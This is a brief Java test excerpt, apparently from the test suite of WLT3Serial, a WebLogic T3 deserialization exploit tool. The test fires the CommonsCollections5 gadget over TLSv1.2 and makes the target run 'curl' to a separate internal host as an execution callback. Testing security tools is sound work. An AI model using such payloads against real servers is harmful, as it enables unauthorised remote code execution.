...
public class TLSv12Test {
	...
	public void testAssertUsingTLSv12() {
		...
		WLT3Serial.main(new String[] {"--t3s=TLSv1.2",host,strPort,"CommonsCollections5","curl http://192.168.1.12/"+this.getClass().getName()+"testAssertUsingTLSv12"});
		...
		System.out.println(this.getClass().getName()+"->testAssertUsingTLSv12: WLT3Serial executed successfully using T3S with TLSv1.2");
	}
}
